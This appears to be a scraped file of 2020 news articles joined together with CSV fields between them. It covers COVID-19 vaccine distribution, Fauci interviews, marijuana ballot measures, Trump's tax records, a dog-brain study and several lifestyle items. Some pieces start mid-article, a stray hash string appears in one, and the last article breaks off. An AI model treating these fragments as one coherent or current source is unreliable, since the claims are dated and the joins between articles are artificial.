The report proposes distributing a vaccine in four phases as it becomes available. The first recipients are obvious picks: health-care workers, emergency responders, people with underlying conditions, and older adults living in group settings. This mirrors similar recommendations by the World Health Organization, and it is a foundational principle for the COVAX collaboration, a global effort to improve poorer countries’ access to a vaccine, which 171 nations have pledged to join. (The U.S. is not one of them, and a small group of scientists question the wisdom of putting some health-care workers at the top.)

But for the first time in history, the report also recommends that priority be given to people who score high on the CDC’s Social Vulnerability Index, which identifies factors such as poverty, lack of access to transportation, or crowded housing that are linked to poor health outcomes. The committee of virologists, epidemiologists, economists, and other health researchers who wrote the report said the goal is to rectify the pandemic’s disproportionate burden on minorities and poor people and “work toward a new commitment to promoting health equity.”

The disparities are stark: Compared with white people, African Americans, Hispanics, and Native Americans are nearly three times more likely to contract the coronavirus. Blacks are twice as likely to die.

“This approach allowed us to embrace a notion of equal regard for all people, and address the underpinnings of social inequity and factors that have landed African Americans, Hispanics, and Native Americans in situations and occupations in which they are less healthy,” committee member Jewel Mullen, associate dean for health equity at Dell Medical School at the University of Texas at Austin, tells National Geographic.

Despite the report’s nuanced guidelines, it’s not clear how they will be practiced or enforced, nor how they will play out as the country prepares for an unprecedented vaccine rollout.

Next in line

The highly contagious nature of COVID-19 is forcing officials to consider social criteria—such as protecting people living in group housing or working in conditions in which transmission is more likely—when deciding who gets the vaccine first.

The report authors are recognizing the vital roles of essential workers, such as teachers, bus drivers, and grocery stockers, on whom the rest of us depend.

The second phase of the recommended rollout would include the remaining adults older than 65, K–12 teachers, school staff, and childcare workers—as well as essential workers in industries such as meatpacking that don’t allow social distancing. Residents and staff of group homes, homeless shelters, prisons, and detention centers also fit into this category.

Children, young adults under 30, and other critical workers at increased risk are in the third group. The fourth wave includes everyone else residing in the U.S.

It’s very short-sighted to think we can get this thing behind us if we just take care of our own.

Now that it’s been submitted, the report will be considered by the Advisory Committee on Immunization Practices (ACIP), a nongovernmental organization that makes public policy recommendations on the use of licensed vaccines to the CDC. While ACIP’s suggestions aren’t binding, they’re usually adopted.

“These won’t be rigid recommendations. We need some flexibility,” says Jose Romero, ACIP committee chair and Secretary of Health for the state of Arkansas.

That’s because health-care regulators want to avoid some of the pitfalls encountered when they prepared for a vaccination campaign during the H1N1 flu pandemic, which killed more than 12,000 people in the U.S. At that time, counties geared up for distribution of the vaccine to the first priority group, but the shipments arrived so slowly that the threat had passed by the time they received large quantities. Historically, when supplies are limited, mass vaccination can be successfully replaced with an approach that targets those most at-risk, but the shortage wasn’t anticipated in time.

“It came in dribs and drabs, and each state got a couple thousand doses at first,” says Jennifer Nuzzo, an epidemiologist from the Johns Hopkins Center for Health Security.

Romero acknowledges that individual states or counties might have vulnerable populations, such as workers in local meatpacking plants, whom they want to focus on after receiving early vaccine shipments in a second phase.

What is fair?

Romero says that both the ACIP and the National Academy of Medicine are “aligned” in their mission to promote health equity, but that ACIP is waiting to learn which vaccines will be approved before issuing final guidelines.

“Our recommendations will probably change over time, as each version comes forward and we learn about its efficacy,” Romero says. “Maybe one doesn’t work as well in the elderly, so we would focus it on younger people.”

There’s already precedent for using fairness considerations to determine priority for other health-care resources during the COVID-19 pandemic.

When supplies of remdesivir—the experimental antiviral drug that President Donald Trump partially credits for his recent recovery—were in short supply in June, the University of Pittsburgh Medical Center implemented a weighted lottery system for patients. The hospital had enough for only about one in four patients, but those from disadvantaged backgrounds received a roughly one in three chance of being selected. So did health-care and essential workers in jobs that have a higher risk of infection.

(Related: Who infected President Trump? This genetics tool could easily pinpoint the source.)

Administrators didn’t make distinctions based on age, race, ethnicity, disability, ability to pay, or whether someone had children to care for. Rather, they used a metric called the “area deprivation index,” a database developed by the University of Wisconsin that incorporates more than a dozen census variables, including income, education, and housing.

“If you’re suffering from the disadvantages of poverty and poor access to health care and jobs that put you historically at a higher risk of dying, then we’re going to take some steps to lessen the disadvantage you’re experiencing,” explains Douglas White, director of the program on ethics and decision-making in critical care medicine at the University of Pittsburgh. He says that the model could be used for future drug shortages, such as convalescent plasma or monoclonal antibodies.

Frozen logistics?

At the same time, state and county local health departments are balancing these recommendations with preparations for how to distribute whatever vaccine doses become available. Last week, Health and Human Services Secretary Alex Azar announced that the U.S. government was manufacturing six potential vaccines in 23 facilities and would have 100 million doses ready by the end of the year and enough for every American by spring.

Without thoughtful planning, logistical challenges with this huge deployment could create disparities in access to this life-saving remedy. Two frontrunner candidates—by the biotech company Moderna and the pharmaceutical giant Pfizer—require two doses spaced about a month apart and are chemically unstable at room temperature. As a consequence, those drugs must be shipped and stored frozen, and Pfizer’s version, moreover, must be kept at minus 94 degrees Fahrenheit, which is colder than standard freezers.

That’s why both the WHO and the National Academy report list vaccine storage and transport as crucial elements for equitable vaccine distribution. Vaccine shortages are already a problem for rural America due to years of hospital closures, and the mere lack of refrigerators has stymied efforts to eliminate diseases around the world for decades. To help with shipping, UPS is building two huge freezer farms in Kentucky and the Netherlands that will contain 600 deep freezers that would store 48,000 vaccine vials. Another option is a vaccine—such as Johnson & Johnson’s candidate—that can be administered in a single dose and does not require cold storage. But it’s a couple months behind in the vaccine race.

(Related: Dozens of COVID-19 vaccines are in development. Here are the ones to follow.)

Health regulators are also trying to anticipate how many supplies, such as syringes, including adult and child sizes, to stockpile and whether they need to train additional people to administer the shots, especially for a two-dose vaccine. HHS officials have stated that the U.S. alone could require 650 million to 850 million syringes and needles, and that it could take two years to manufacture them.

“It’s not just the science of vaccine development we need to think about, but what it’s going to take to get it to the people who need it,” says Nuzzo of Johns Hopkins.

What’s also unknown is whether vaccine shipments will arrive in manageable waves so they can be distributed through the doctor’s offices and pharmacies used for seasonal flu shots—or whether officials would need to find larger spaces like stadiums.

Unlike influenza, the threat of COVID-19 won’t fade, given that nine in 10 people remain susceptible to infection. And the challenges of distributing this vaccine could be unlike any other, says medical historian Howard Markel of the University of Michigan.

It’s like we’re in the middle of a war and everyone needs a Kevlar vest.

“A lot of vaccination programs weren’t done in the middle of the worst pandemic of our generation,” says Markel. “It’s like we’re in the middle of a war and everyone needs a Kevlar vest.”

Many legacy vaccines were mass produced after outbreaks were over. One exception is the polio vaccine, but it required an epic effort to scale up quickly. The Eisenhower Administration licensed six different companies for polio vaccination campaigns in 1954, and then used assembly lines at high school gymnasiums, civic centers, and dance halls to produce them.

Global public health experts are also asking wealthy countries to consider COVID-19 vaccines as a “global public good” and to earmark funding and doses for another needy group: poorer countries.

Not only can unvaccinated travelers continue to spread the virus, our national interests depend on healthy foreign populations maintaining global supply chains, says Ruth Faden, bioethicist at Johns Hopkins University in Baltimore and member of the international organization’s COVID-19 vaccine working group.

“Wealthy countries are focusing primarily on securing vaccines for their own populations,” Faden says. “But it’s very short-sighted to think we can get this thing behind us if we just take care of our own.”

Yet as the world waits for a vaccine winner to hammer out the details, the emphasis on equity by health officials is meant to reassure people.

“It’s an important message to present to the public,” Mullen from the University of Texas says, “that there's a deliberate body thinking about how to advance the vaccine in a process that’s fair to all of us.”",Who will get the vaccine first? Here's where you might land in line.,

Halo: The Master Chief Collection has proven to be an excellent option for newcomers to the franchise and older fans alike. However, those hoping to see Halo 5: Guardians added to the collection are out of luck. Developer 343 Industries has once again confirmed that there are no plans to add the game to the overall compilation. In a new blog post, 343 Industries stated that Halo 4 ""is the last Halo title we currently have planned for the collection (sorry to crush your Halo 5 in MCC dreams), so let's finish strong!"" For now, that means fans will have to stick with the version available on Xbox One.

It's worth noting that the use of the word ""currently"" does leave the door open for a future addition to the compilation. That likely won't come in time for players looking to get caught up on the series before the release of Halo Infinite, however, particularly those playing on PC, as Halo 5 has yet to make its way to the platform.

Halo: The Master Chief Collection is a compilation that features remastered games from the series, as well as additional content. Interestingly enough, the compilation does include the beta for Halo 5's multiplayer, despite the fact that the game itself will not be included. The Master Chief Collection originally released on Xbox One in 2014, and 343 Studios has continued to add new games and patches to the collection over the last few years. The compilation also released on PC last year, and games have slowly been made available, since. Cross-play between the two versions is currently unavailable, but the feature is coming sometime in the future.

The news might be a bit disappointing, but Halo fans have had a bit of a rough year, in that regard. Halo Infinite was set to release alongside the Xbox Series X/S this year, but the game has been pushed back to a 2021 release window. Fortunately, fans will have Halo: The Master Chief Collection and Halo 5: Guardians to play on the next-gen platform to keep them busy, in the meantime. Just don't expect to see the latter on PC anytime soon.

And while it's had its zingers, this new puzzle that was recently aired on the show has stumped pretty much all of America. Like, people are losing it over this one question. LOSING. IT. The question asks contestants to fill in the blanks of a statement, the statement being: _ _ CK / _ T / _ O R K. If you've had a look at the puzzle, you're probably coming up with your own answers to it. I'm here to tell you: Nope, you're probably, in most likelihood, wrong.

The puzzle first went viral when an individual took to social media platform Twitter to share it. In addition to a photo of the actual question (presumably taken of their television screen on their phone), the Twitter user posted their own answer. ""Suck it dork,"" Twittersgoodboy wrote with confidence. While meant to be humorous, it sent all of Twitter into a frantic tizzy, with hundreds of other users chiming in with their answers. Kevbauder suggested, ""Could be Lick it Bork."" Thorazos responded, ""F*CK AT WORK,"" which was perhaps the greatest answer of them all.

Even more users added: Lick it fork, c*ck at work, lick it pork, f*ck it mork, Jack at work, and so on and so forth. The real answer, however, was less ridiculous and, to no one's surprise, definitely not as scandalous as some of the suggested responses. The correct answer was... Drum roll, please... ""Back at work!"" And there you have it, folks, quite possibly the most boring answer ever.

This State Will Make Marijuana History in November | The

",11/10/2020 14:39,https://www.fool.com/investing/2020/10/04/this-state-will-make-marijuana-history-in-november/,"There are expected to be a number of fast-growing trends this decade, including cloud computing, the Internet of Things, artificial intelligence, and cybersecurity. But don't sleep on marijuana.

After generating an estimated $10.9 billion in worldwide sales in 2018, legal channel cannabis sales are expected to hit anywhere from $50 billion to $200 billion a year by 2030, according to various Wall Street estimates. Yes, this is a pretty wide range, but it's to be expected of an industry that's never been legalized in the modern era, and which has tens of billions of dollar in activity occurring behind the scenes.

It's also an industry that could soon get a lot bigger in the United States. Currently, two-thirds of all states have given the green light to medical marijuana, with 11 of these states also allowing for the consumption and/or retail sale of adult-use weed. But in less than a month, we could see these figures tick higher.

The Nov. 3 election will feature five states with cannabis measures on their respective ballots. However, none is going to be more unique than what the Mount Rushmore State is presenting to its residents.

The Mount Rushmore State is four weeks away from making cannabis history

While we've witnessed a number of unlikely ballot measures before, South Dakota is about to do something no state has previously attempted: It's trying to legalize medical and recreational marijuana at the same time, albeit with two separate ballot measures.

First up, Mount Rushmore State voters will have to weigh in on Measure 26, which would establish a medical marijuana industry in the state for patients with predefined debilitating medical conditions. The measure would allow qualifying patients to possess up to three ounces of cannabis, as well as grow at least three cannabis plants at their residence, as prescribed by a physician.

Initially, Measure 26 would include severe nausea, seizures, and severe or persistent muscle spasms among the list of qualifying debilitating medical conditions. However, South Dakota's Department of Health would be free to add to the list of qualifying conditions upon passage of the measure.

Secondly, South Dakotans will also being voting on Constitutional Amendment A, which would legalize recreational marijuana throughout the state. Pretty much in-line with what we've seen in other adult-use-legal states, South Dakota will establish a legal age for consumption and possession of 21, and (more specific to the state) will assign a 15% tax rate on weed sales.

What's interesting about the recreational legalization measure is that it doesn't establish a medical marijuana program or provide hemp guidelines in the state. This means the South Dakota State Legislature would be responsible coming up with the rules and regulations governing a medical cannabis and hemp industry by or before April 1, 2022.

Considering that we have no precedent of a state jumping from wholly illicit to recreationally legal, I'm not certain Amendment A will pass. But favorability toward medical marijuana is high (pardon the pun), making passage of Measure 26 fairly likely.

Four other states will join South Dakota on Election Day

In addition to South Dakota, four other states will by vying to go green.

The only currently illicit state (other than South Dakota) that's attempting to legalize medical marijuana is Mississippi. The Magnolia State has a two-part cannabis question on its ballot that'll require residents to first assess their palatability to medical marijuana, and secondly choose which type of medical cannabis program they prefer. Initiative 65 is a more traditional program that allows physicians to prescribe cannabis for 20 qualifying conditions. Meanwhile, Initiative 65A restricts the smoking of medical marijuana to patients with terminal illnesses and provides increased regulatory oversight.

The other three states – New Jersey, Arizona, and Montana – are all voting on recreational pot initiatives.

New Jersey was the first state to get a measure firmly on the ballot for the November election. Polling has suggested that Public Question 1 has a good chance to pass. As a reminder, New Jersey's legislature was very close to waving the green flag on recreational weed in early 2019, but was ultimately derailed by social measures. Residents will instead get to decide the Garden State's fate in a little over four weeks.

Similar to New Jersey, Arizona seems to have an above-average opportunity to legalize adult-use cannabis. Arizona narrowly voted down Proposition 205 in Nov. 2016 (48.7% in favor), which would have legalized recreational weed in the Grand Canyon State. History has shown that the second time is the charm when it comes to recreational legalization measures.

Montanans will also have two measures they'll be voting on, both of which work toward the same goal. Montana Cl-118, if passed, would allow the states' constitution to be amended, making 21 the legal age of cannabis purchase, use, and possession. Then there's I-190, the actual adult-use pot measure that would impose a 20% tax rate if passed. Of the three recreational-only votes, Montana should be the most closely contested.

U.S. multistate operators should have a field day

No matter what happens with the presidency come Nov. 3, there's a very good chance the number of legalized recreational and/or medical marijuana states will increase. With the federal government maintaining a hands-off approach to regulation (i.e., allowing states to regulate their own pot industries), U.S. multistate operators (MSO) appear primed to have a field day in 2021.

In particular, some of the largest publicly traded MSOs are in great shape to benefit from new legalizations and ongoing organic expansion in legalized states. For instance, Curaleaf ( CURLF -2.15% ) recently closed its acquisition of Grassroots, which has increased its operating retail locations to 93, and bumped up its presence to 23 states. Curaleaf has an existing presence in New Jersey, and looks to be on track to hit $1 billion in full-year sales by 2021.

Green Thumb Industries ( GTBIF -2.56% ) will also see a bump-up in sales, but not solely because of newly legalized states. Though Green Thumb has a presence in New Jersey, it's Nevada and Illinois that can be even more lucrative markets from an organic growth perspective. Green Thumb currently has 48 open dispensaries, but holds enough licenses to double this figure.

Investors often love to follow the money to big gains -- and it's pretty evident that, when it comes to marijuana stocks, the U.S. is where the green will be freely flowing.",This State Will Make Marijuana History in November,

The Worst Day of the Week to Eat at a Restaurant | Eat This
Not That

",11/10/2020 9:38,https://www.eatthis.com/worst-day-eat-chain-restaurant/,"When you have a hankering for Olive Garden breadsticks or just can't wait to enjoy some appetizers while you sip on drinks during happy hour at Applebee's, it can be hard to wait in a long line to satisfy those cravings. Even worse, the day you choose to eat at a restaurant can even impact how much money you pay and how fresh your meal will be.

Yes, there really is a bad day to dine out! (If you happen to stay in and cook a meal for yourself, be sure you're trying out the 21 Best Healthy Cooking Hacks of All Time.)

Weekends are typically the busiest time for restaurants, which might make you think Saturday or Sunday is the worst day to dine out. But as it turns out, because weekends are so busy, many restaurants keep an all-star team ready to handle the rush. Also, restaurants often get deliveries of fresh products on Thursdays and/or Fridays in preparation for a busy weekend.

As such, your food will likely be better prepared and fresher if you dine on the weekend, although you might have to wait a bit longer to be seated and you'll likely miss out on savings like happy hour and lunch specials, as these are often weekday promotions to lure in more business. Looking for more helpful tips? Your ultimate restaurant and supermarket survival guide is here!

With that in mind, which day of the week should you always steer clear of chain restaurants?

Mondays, a dreaded day for many people, is actually the worst day of the week to eat at a chain restaurant. The first food delivery of the week for many restaurants is actually Tuesday, so you'll be eating food that isn't as fresh as you may hope. You might still find a long wait, too, as people opt to dine out after a long day right after the weekend.

One restaurant employee explained on Quora about the best day to order fish, ""I would still avoid fish in many restaurants on a Monday because, it's generally when the 'B' team is on. Again from a personal perspective, my restaurants will average 500 a day Friday to Sunday, so we have the top guys in the kitchen. Monday is a 180 cover day.""6254a4d1642c605c54bf1cab17d50f1e

If nothing else, even the vibe can be off for diners and staff on a Monday. According to Shoes for Crews Europe, a slip-resistant shoe brand for restaurant workers, ""Most studies and reports from other restaurant owners say that the slowest restaurant days are Mondays and Tuesdays. The social suggestion is, then, that most people are feeling too tired and are suffering from post-weekend blues to consider going out to eat on Monday and Tuesday nights.""

So if you can stick it out another day, skip dining out on Monday to ensure a fresher meal. And in case you want to know which day is actually the best to dine out, we uncovered that for you, too.",The Worst Day of the Week to Eat at a Restaurant — Eat This Not That,

Stormi Webster is old enough to go to school. Feel old yet?

She’s also old enough to bring a designer bag to said school. Feel poor yet?

The daughter of beauty mogul Kylie Jenner and rapper Travis Scott went to her first day of home school wearing a $12,000 backpack, and the response from fans was a resounding “can’t relate!”

Jenner shared a video of Stormi jumping up and down in her driveway wearing the designer accessory.

“First day of school! First day of school!” the toddler exclaimed in the clip.

It’s no surprise that Jenner has quite the collection of Hermes items, specifically ultra-expensive Birkin bags, but seeing a 2-year-old swinging around an item that costs more than a down payment for a house is always a bit shocking.

“I guarantee Stormi would have picked a ‘Frozen” Jansport backpack rather than a 12k Hermès one if she had the choice,” one Twitter user wrote.

“First day of homeschool and Stormi got her Kelly backpack on, I hate being poor,” another said.

“Stormi’s backpack alone could probably help me pay off some loans,” a third joked.

Jenner has come under fire in the past for giving her daughter lavish gifts.

In 2018, she shared a video of her then-1-year-old daughter wearing a diamond ring fans assumed she gave her for Christmas. She’s also reportedly bought Stormi a $1,000 Prada bag and a $200,000 pony. Let’s not forget all those lavish birthday parties, either.

Dogs surprisingly don't care about 1 part of the body as
much as we thought

",9/10/2020 14:05,https://www.inverse.com/science/dogs-dont-like-your-face,"There are few things more relaxing than staring deeply into the eyes of your canine companion, but a new study suggests dogs might not be as into our faces as we are into theirs.

Humans and primates have a demonstrated love for faces — so much so that we've evolved a whole section of our brains to process both human and non-human faces. But while previous research suggests dogs can hold eye contact and even read our emotions via our facial expressions, researchers hadn't tested whether dogs' brains were wired to prefer faces in the same way as humans'.

Now, we know. Unlike humans, primates, and even tortoises, dogs' brains react the same to a face as they do to the back of someone's head.

But don't worry: The human-dog love story isn't dead. This result may actually mean dogs love you no matter how you might look to anyone or anything else.

In the study, which was published Monday in the journal JNeurosci, researchers scanned both human and dog volunteers' brains using fMRI.

Family dogs in Hungary and Mexico were recruited for these fMRI studies. Enik Kubinyi / Eötvös Loránd University

The study was conducted across two labs — one in Hungary, and one in Mexico. The Hungary lab scanned only humans, while the Mexico lab took on the dogs and human participants. To ensure the dogs already had familiarity with human faces, the pooches recruited were all family dogs. In total, the researchers studied 30 humans and 20 dogs.

The researchers traced brain function data while both the human participants and the canine participants watched short videos of either: human faces, dog faces, the back of a human's head, or the back of a dog's head. The faces shown were neutral in expression and, in the case of human faces, didn't feature any piercings or heavy makeup. To ensure that the dogs didn't feel threatened, the dogs and humans on-screen looked away from the camera.

After completing several scans over several days, the researchers analyzed how similar — or different — the humans and dogs' brain responses appeared.

Not a face fan — Surprisingly, the researchers found dogs' brains don't have a specialized area that responds to faces, whether they be of the human or canine variety. In fact, dogs demonstrate no preference between viewing the back of a human or dog's head versus their face.

But the dogs did seem to prefer looking at other dogs as opposed to humans. This was actually something they shared with the human cohort — they too preferred their own species' faces.

But the humans' preference for any face (human or canine) was stronger than their preference for other body parts (in this case, the back of a human head). This is the inverse of what the researchers discovered about the dogs. They appear to prefer their own species first (either the front of the face or the back of the head), and not any human face.

Once in the fMRI, both dogs and humans watched a rotation of videos showing human and dog faces. Enik Kubinyi / Eötvös Loránd University

In a statement accompanying the study, first author and researcher at the Hungarian Academy of Sciences Nóra Bunford said these differences are important for planning future — and interpreting past — canine research.

""[This] demonstrates that there can be substantial dissimilarities in cortical specialization for face perception across mammals,"" explains Bunford. ""These findings also shed new light on previous dog fMRI studies claiming to have found 'face areas:' we now think that the stronger activity to dog faces in those studies indicated dog-preferring rather than face-preferring brain areas.""

Lost love? — While our pets' brains may not be wired to prefer our faces, previous research has demonstrated that pet pooches do recognize and even love their owners. Our pets may also be demonstrating their preference for us through other sensory means, like our scent or the sound of our voice.

Moral of the story? Man's best friend doesn't care what you look like and they love you all the same.

Abstract: Conspecific-preference in social perception is evident for multiple sensory modalities and in many species. There is also a dedicated neural network for face processing in primates. Yet, the evolutionary origin and the relative role of neural species-sensitivity and face-sensitivity in visuo-social processing are largely unknown. In this comparative study, species- and face sensitivity to identical visual stimuli (videos of human and dog faces and occiputs) were examined using functional magnetic resonance imaging in dogs (n=20; 45% female) and humans (n=30; 50% female). In dogs, the bilateral mid suprasylvian gyrus showed conspecific-preference, no regions exhibited face-preference, and the majority of the visually responsive cortex showed greater conspecific- than face-preference. In humans, conspecific preferring regions (the right amygdala/hippocampus and the posterior superior temporal sulcus) also showed face-preference, and much of the visually-responsive cortex showed greater face- than conspecific-preference. Multivariate pattern analyses identified species sensitive regions in both species, but face-sensitive regions only in humans. Across-species representational similarity analyses revealed stronger correspondence between dog and human response patterns for distinguishing con- from heterospecific faces than other contrasts. Results unveil functional analogies in dog and human visuo-social processing of conspecificity but suggest that cortical specialization for face perception may not be ubiquitous across mammals.",Dogs surprisingly don't care about 1 part of the body as much as we thought,

With menu items like the Crunchwrap Supreme and $1 Nacho Fries (or Buffalo Chicken Nacho Fries), it may come as a surprise that Taco Bell offers up some of the healthiest options on the fast food scene. Dig a little deeper into their menu and you’ll find that there are some better-for-you options if you don’t have time to make a homemade meal. (Have time on your hands? Try these fiesta-worthy recipes for tacos, fajitas and more.)

Over the past several years, Taco Bell has positioned themselves as one of the best fast food chains for healthy food, making strides to offer customizable options across their menu for their health-conscience customers.

According to the nutrition page on their website, these are some of the quality improvements they’ve made over the past few years to their menu:

Reduced sodium across the menu by 15 percent since 2008, with a push to have a total 25 percent reduction by 2025.

Removed artificial flavors and colors and replaced them with natural alternatives.

Source 100% cage-free eggs for our breakfast menu. 100% cage-free egg ingredients were introduced to the menu in 2018.

Serve chicken raised without antibiotics important to human medicine in U.S. restaurants

While these options and improvements are great, and definitely a step toward healthier eating, it’s largely up to the customer to customize smart choices, like ordering vegetarian or vegan options, or calorie-cutting with their ‘Fresco’ option to remove cheese, rice, sour cream, and add in pico de gallo.

“We just really encourage people to customize to however it fits their lifestyle,” Missy Schaaphok, Taco Bell’s in-house nutritionist and dietitian told Business Insider in 2016.

Dr. Fauci Just Said the 4 Words You've Been Waiting to
Hear
",7/10/2020 8:17,https://www.yahoo.com/lifestyle/dr-fauci-just-said-4-130829177.html,"It feels like we're at another turning point with the COVID pandemic. After weeks of declining coronavirus case numbers nationwide, we've had a change of luck and cases are now climbing in 32 states across the U.S., The New York Times reports. But it's not all bad news, according to Anthony Fauci, MD. In a conversation with Wired editor at large Steven Levy published on Sept. 30, Fauci actually sounded optimistic, particularly when discussing the COVID vaccine. In fact, Fauci said the positive words you've likely been waiting to hear: ""This outbreak will end.""

He added, ""We will get a vaccine. And then if we combine a vaccine with prudent public health measures, we can put this outbreak behind us.""

Levy told Fauci that he's among the majority of Americans who are suspicious that a vaccine might be rushed before the November election. That statistic he's referring to is likely from a Sept. 17 poll out of the Pew Research Center, which found that 77 percent of Americans believe a vaccine would be approved before it could be proven safe and effective and 78 percent believe the process is moving too quickly. As a result, only 21 percent of American adults surveyed said they definitely plan to get the vaccine, a drastic drop from May when 42 percent said they would get vaccinated.

Work on vaccine against virus

""The fear is understandable, but if I give you the facts, I hope that you would see it's not reasonable,"" Fauci said, adding he has full confidence in the process. ""The way the system is set up, there [are] independent bodies that have access to the data that no one else has access to. And they make the decision based on the scientific data, whether the vaccine is safe and effective."" This Data and Safety Monitoring Board, made up of clinicians, vaccinologists, statisticians, and ethicists, are ""the only ones … who intermittently look at the data and they can come to any of a number of conclusions.""

With five vaccines now in the final stage of trials, Fauci reiterated the vaccine timeline he's previously discussed. He believes ""it is likely that we will know whether we have a safe and effective vaccine somewhere around November and December."" He added there will be about 100 million doses by the end of the year for those who need it most, and up to 700 million doses by the end of April for the rest of the population.

Fauci has been trying to regain the public's confidence in regards to a coronavirus vaccine for the past few weeks. In an interview with Vox reporter Sean Rameswaram on Sept. 25, he said, ""Everybody is worrying that someone is going to make an end run around that and try to get a vaccine out for political reasons. Well, that will not happen, but if it does … it will be really transparent. Because the scientists will see the data. The FDA has pledged publicly multiple times that they will not approve a vaccine unless they've established that nonpolitical scientists agree that it's safe and effective.""

Similarly, during an interview at the Texas Tribune Festival on Sept. 29, Fauci said, ""I feel cautiously optimistic, as a scientist, that we will have a safe and effective vaccine. I believe it will happen, and it will happen likely by this end of the calendar year.""

But in his conversation with Wired, Fauci made clear that the prospect of a vaccine isn't the only reason he's optimistic. Simply put, he says looking on the bright side is the only way to get through this pandemic.

""We should not despair, 'cause despair makes you throw your hands up and say, 'It doesn't matter what I do, what's going to happen is going to happen,'"" Fauci said. ""That is incorrect. It does matter what we do. And if we do it for a while longer, we will look behind us and the outbreak will be behind us, not among us.""

Bombshell Report Shows How Much Trump Paid in Taxes to
Foreign Governments
",5/10/2020 13:54,https://www.vice.com/en/article/ep4eme/bombshell-report-shows-how-much-trump-paid-in-taxes-to-foreign-governments,"The year he was elected to the White House, President Donald Trump paid just $750 in taxes to the IRS. During the same period, he paid foreign governments over $300,000 in taxes, leading many to question his claim of putting “America first.”

The details of Trump’s tax filings have been published for the first time in a bombshell report in the New York Times, which details the president’s tax filings for the last two decades. The report not only lays bare Trump’s tax-avoidance schemes but also exposes the potential conflict of interest created by the president’s continued business involvements in some of the world’s geopolitical hotspots.

The documents reveal the Trump organization as a network of hundreds of companies whose losses Trump uses to pay virtually no income tax.

In 2016, the year he won the presidency, Trump also paid just $750 in taxes and in 10 of the previous 15 years, Trump paid $0 in personal income taxes.

Trump managed to reduce his U.S. income taxes despite generating hundreds of millions in revenue from the NBC reality show “The Apprentice,” and from endorsements and property investments, through accounting practices that helped him write off huge losses at many of his other companies.

But when it came to paying taxes on his overseas earnings, Trump appears to have been much less concerned about limiting his liability.

When Trump became president, he said he would pursue no new foreign deals while in office, but that didn’t stop him raking in significant revenue from the overseas deals he already had in place.

In his first two years in the White House, his revenue from abroad totaled $73 million, the Times reports. While much of that is from golf properties in Ireland and Scotland, it also includes deals in countries with strongmen leaders that Trump has openly praised, such as Rodrigo Duterte in the Philippines, Narendra Modi in India, and Recep Tayyip Erdogan in Turkey.

During 2016 and 2017, Trump earned $3 million in licensing deals in the Philippines, $2.3 million from similar deals in India, and $1 million in Turkey from putting his name on two towers.

The records obtained by the Times show that Trump reported paying taxes on a number of his overseas ventures. In 2017, Trump’s $750 U.S. tax payment was dwarfed by the $15,598 he or his companies paid in Panama, $145,400 in India, and $156,824 in the Philippines.

But the continued revenue stream from these countries also created conflicts for Trump while in the Oval Office.

In the Philippines, Duterte appointed the businessman behind the Trump tower in Manila as a special trade envoy to Washington.

Mehmet Ali Yalcindag, who helped Trump secure a licensing deal in Istanbul in 2008 that has so far netted the president $13 million, was appointed as chairman of the Turkey-U.S. Business Council and regularly lobbied U.S. government officials.

When relations between Istanbul and Washington deteriorated, a Turkish business group canceled a conference at Trump’s Washington hotel, but rescheduled the event six months later when relations had improved.

The deal in Istanbul, which involved two Trump-branded towers, is under scrutiny for another reason, as it involved huge consulting fees of almost $2 million paid to an unknown consultant.

A source with knowledge of the deal in Istanbul told the Times there was never any third-party consultant involved.

The payment of large consulting fees was a tactic Trump employs often: between 2010 and 2018, the president wrote off some $26 million in unexplained “consulting fees” as a business expense across nearly all of his projects.

Advertisement

The Times linked the payment of some of those consulting fees to Trump’s daughter Ivanka, suggesting Trump was using the mechanism to transfer assets to his children without incurring a gift tax — something Trump’s father Fred was also accused of doing.

At a news conference shortly after the Times article was published online, Trump called the findings “totally fake news, made-up, fake,” but didn't dispute specific data cited by the report.

While Democratic presidential nominee Joe Biden is yet to comment on the revelations, his campaign is already seeking to take advantage with social media campaigns highlighting how much less Trump paid in taxes compared to teachers, nurses and firefighters.

Other Democrats were quick to attack Trump’s tax records, too particularly his willingness to pay more income tax to foreign governments than to the IRS.

“Befitting his pattern of selling out the American people throughout his presidency, today’s reporting paints a grim picture of Trump as a grifter who paid more in income taxes to foreign governments than to the United States,” Rep. Donald McEachin (D-VA) said in a statement.",Bombshell Report Shows How Much Trump Paid in Taxes to Foreign Governments,

In fact, this week 22 states reported increasing infections, with many also experiencing an increase in the number of daily deaths and the testing positivity rate. According to Dr. Fauci, there is one thing that could help turn the coronavirus pandemic around, but it would require all of our participation. Read on, to ensure your health and the health of others, don't miss these Sure Signs You've Already Had Coronavirus.

Fauci Says What He'd Do if He Had a 'Magic Wand'

""If you could wave a magic wand over the United States and change one thing tomorrow to improve the trajectory of this pandemic, what would it be?"" the nation's leading infectious disease expert was asked today by Sean Rameswaram in an interview published on Vox.

""I think apart from a vaccine, which we'll have to wait a few months for, if I were to wave a wand now, it would be to get the entire country uniformly pulling together in a public health way to get these cases down,"" he confessed.

Fauci points out that post 911 and Pearl Harbor, ""we didn't have any political arguing about what we needed to do. Everybody was in it together. That's really what we're dealing with.""

Fauci wants people to remember that we shouldn't be fighting each other—as has been the case in America, especially with the ""highly charged political season with big-time, high-stakes elections.""

""We've lost sight of the fact that the bad guy here is the virus. The bad guy is not one side or the other,"" he said.

Fauci Said the Fundamentals Really Work

He reiterated that public health measures—such as his recommended fundamentals of mask wearing, social distancing, avoiding crowded spaces, and staying outdoors instead of indoors— ""should be the gateway and the vehicle to getting the country's economy back and opening up the country.""

Story continues

And yet, ""there are some who interpret that as an obstacle. It isn't the obstacle. It's the solution.""

Dr. Fauci wants to keep hammering this message home: ""We're all in this together. And when you have some groups of society who make it a political issue, it makes it very complicated to get a uniform, consistent approach in our country.""

So, if he could perform magic, his ultimate spell would be to unite the country.

""I don't want to get too melodramatic, but we are at war with a virus. We are not at war with each other. So my magic wand would be … a spirit of pulling together.""

This Fruit Can Give You an Instant Brain Boost, Study Says
According to a recent study, eating wild blueberries could be one ...

",3/10/2020 8:35,https://www.eatthis.com/fruit-brain-boost/,"Over the years, scientific research has shown that while a balanced diet is key to staying healthy, there are certain foods that just knock it out of the park in terms of overall benefits for your body. But what about your mind? It turns out, there might be at least one easy option: According to a recent study, eating wild blueberries could be one of the easiest ways to give your brain an instant boost.

A recent randomized, double-blind, cross-over study examined 35 middle-aged individuals between 40 and 65 years old that were fed either one cup of wild blueberries or a placebo equivalent for breakfast. They were then asked to complete a series of cognitive tasks over the course of the day that tested brain function and memory. (Related: 21 Best Healthy Cooking Hacks of All Time.)

